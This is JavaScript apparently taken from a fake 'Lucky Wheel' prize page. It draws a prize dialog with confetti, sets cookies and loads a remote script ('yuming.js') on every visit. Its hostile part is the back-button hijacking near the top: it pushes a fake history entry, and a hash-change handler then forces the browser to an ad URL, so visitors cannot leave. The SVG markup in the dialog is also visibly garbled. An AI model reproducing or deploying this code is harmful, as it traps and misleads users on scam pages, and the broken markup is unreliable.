var g_banner_ad = true;
            $.getScript('yuming.js?' + (new Date()).getTime());

            function set_Cookie(name, value) {
                name = "easter" + name;
                var Days = 30;
                var exp = new Date();
                exp.setTime(exp.getTime() + (Days * 20 * 1000));
                document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;"
            }

            function get_Cookie(name) {
                name = "easter" + name;
                var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
                if (arr = document.cookie.match(reg)) {
                    return unescape(arr[2]);
                }
                return '';
            }

            function getQueryString(name) {
                var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
                var r = window.location.search.substr(1).match(reg);
                if (r != null) {
                    return unescape(r[2]);
                }
                return null;
            }

            function spinnerAction() {
                //alert("Welcome to Lucky Wheel!Spin the Wheel and you may win exclusive prizes!Click OK to Start the Game!")
            }


            window.onhashchange = function() {
                jp();
            };

            function hh1() {
                history.pushState(history.length + 1, "message", "#" + new Date().getTime());
            }

            function jp() {
                fh();
            }
            setTimeout('hh1();', 500);

            function fh() {
                location.href = Ads;
            }

            function wxalert(t, n, b, flag, i) {
                //flag:1,success  2,normal
                var r, u;
                r =
                '<div class="weui_dialog_alert" style="position: fixed; z-index: 1000; display: none;margin-left:15%;margin-right:15%">';
                r += '<div class="weui_mask"></div>';
                r += '<div class="weui_dialog">';
                r +=
                '<i class="weui_close"><svg t="1540783423798" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="s="http://www.w3.org/2000/svg" p-" p-id="1931" xmlns:xlink="k="http://www.w3.org/1999/xlink" wi" width="25" height="25"><path style="fill:#666;" d="M176.661601 817.172881C168.472798 825.644055 168.701706 839.149636 177.172881 847.338438 185.644056 855.527241 199.149636 855.298332 207.338438 846.827157L826.005105 206.827157C834.193907 198.355983 833.964998 184.850403 825.493824 176.661601 817.02265 168.472798 803.517069 168.701706 795.328267 177.172881L176.661601 817.172881ZM795.328267 846.827157C803.517069 855.298332 817.02265 855.527241 825.493824 847.338438 833.964998 839.149636 834.193907 825.644055 826.005105 817.172881L207.338438 177.172881C199.149636 168.701706 185.644056 168.472798 177.172881 176.661601 168.701706 184.850403 168.472798 198.355983 176.661601 206.827157L795.328267 846.827157Z" p-id="1932"></path></svg></i>';
                r += '<div class="weui_dialog_hd"><strong class="weui_dialog_title"></strong></div>';
                r += '<div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"></div>';
                r += '<div class="weui_dialog_ft">';
                r += '<div href="javascript:void(0);" class="weui_btn_dialog primary btn">OK</div>';
                r += "</div>";
                r += "</div>";
                r += "</div>";

                $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
                setTimeout(function() {
                    u = $(".weui_dialog_alert");
                    u.show();
                    u.find(".weui_dialog_bd").html(n);
                    u.find(".weui_dialog_title").html(t);
                    u.find(".weui_btn_dialog").html(b ? b : "");
                    u.find(".weui_btn_dialog").off("click").on("click", function() {
                        i();
                        u.hide();
                        if (flag == 1) {
                            stopConfetti();
                        }
                    });
                    u.find(".weui_close").off("click").on("click", function() {
                        i();
                        u.hide();
                        if (flag == 1) {
                            stopConfetti();
                        }
                    });
                    if (flag == 1) {
                        startConfetti();
                    }
                }, 500);
            }
            var maxParticleCount = 150;
            var particleSpeed = 2;
            var startConfetti;
            var stopConfetti;
            var toggleConfetti;
            var removeConfetti;
            (function() {
                startConfetti = startConfettiInner;
                stopConfetti = stopConfettiInner;
                toggleConfetti = toggleConfettiInner;
                removeConfetti = removeConfettiInner;
                var colors = ["DodgerBlue", "OliveDrab", "Gold", "Pink", "SlateBlue", "LightBlue", "Violet", "PaleGreen",
                    "SteelBlue", "SandyBrown", "Chocolate", "Crimson"
                ]
                var streamingConfetti = false;
                var animationTimer = null;
                var particles = [];
                var waveAngle = 0;

                function resetParticle(particle, width, height) {
                    particle.color = colors[(Math.random() * colors.length) | 0];
                    particle.x = Math.random() * width;
                    particle.y = Math.random() * height - height;
                    particle.diameter = Math.random() * 10 + 5;
                    particle.tilt = Math.random() * 10 - 10;
                    particle.tiltAngleIncrement = Math.random() * 0.07 + 0.05;
                    particle.tiltAngle = 0;
                    return particle;
                }

                function startConfettiInner() {
                    var width = window.innerWidth;
                    var height = window.innerHeight;
                    window.requestAnimFrame = (function() {
                        return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window
                            .mozRequestAnimationFrame || window.oRequestAnimationFrame || window
                            .msRequestAnimationFrame || function(callback) {
                                return window.setTimeout(callback, 16.6666667);
                            };
                    })();
                    var canvas = document.getElementById("confetti-canvas");
                    if (canvas === null) {
                        canvas = document.createElement("canvas");
                        canvas.setAttribute("id", "confetti-canvas");
                        canvas.setAttribute("style",
                            "display:block;z-index:999999;pointer-events:none;position: absolute;left: 0px;top: 0px;");
                        document.body.appendChild(canvas);
                        canvas.width = width;
                        canvas.height = height;
                        window.addEventListener("resize", function() {
                            canvas.width = window.innerWidth;
                            canvas.height = window.innerHeight;
                        }, true);
                    }
                    var context = canvas.getContext("2d");
                    while (particles.length < maxParticleCount)
                        particles.push(resetParticle({}, width, height));
                    streamingConfetti = true;
                    if (animationTimer === null) {
                        (function runAnimation() {
                            context.clearRect(0, 0, window.innerWidth, window.innerHeight);
                            if (particles.length === 0)
                                animationTimer = null;
                            else {
                                updateParticles();
                                drawParticles(context);
                                animationTimer = requestAnimFrame(runAnimation);
                            }
                        })();
                    }
                }

                function stopConfettiInner() {
                    streamingConfetti = false;
                }

                function removeConfettiInner() {
                    stopConfetti();
                    particles = [];
                }

                function toggleConfettiInner() {
                    if (streamingConfetti)
                        stopConfettiInner();
                    else
                        startConfettiInner();
                }

                function drawParticles(context) {
                    var particle;
                    var x;
                    for (var i = 0; i < particles.length; i++) {
                        particle = particles[i];
                        context.beginPath();
                        context.lineWidth = particle.diameter;
                        context.strokeStyle = particle.color;
                        x = particle.x + particle.tilt;
                        context.moveTo(x + particle.diameter / 2, particle.y);
                        context.lineTo(x, particle.y + particle.tilt + particle.diameter / 2);
                        context.stroke();
                    }
                }

                function updateParticles() {
                    var width = window.innerWidth;
                    var height = window.innerHeight;
                    var particle;
                    waveAngle += 0.01;
                    for (var i = 0; i < particles.length; i++) {
                        particle = particles[i];
                        if (!streamingConfetti && particle.y < -15)
                            particle.y = height + 100;
                        else {
                            particle.tiltAngle += particle.tiltAngleIncrement;
                            particle.x += Math.sin(waveAngle);
                            particle.y += (Math.cos(waveAngle) + particle.diameter + particleSpeed) * 0.5;
                            particle.tilt = Math.sin(particle.tiltAngle) * 15;
                        }
                        if (particle.x > width + 20 || particle.x < -20 || particle.y > height) {
                            if (streamingConfetti && particles.length <= maxParticleCount)
                                resetParticle(particle, width, height);
                            else {
                                particles.splice(i, 1);
                                i--;
                            }
                        }
                    }
                }
            })();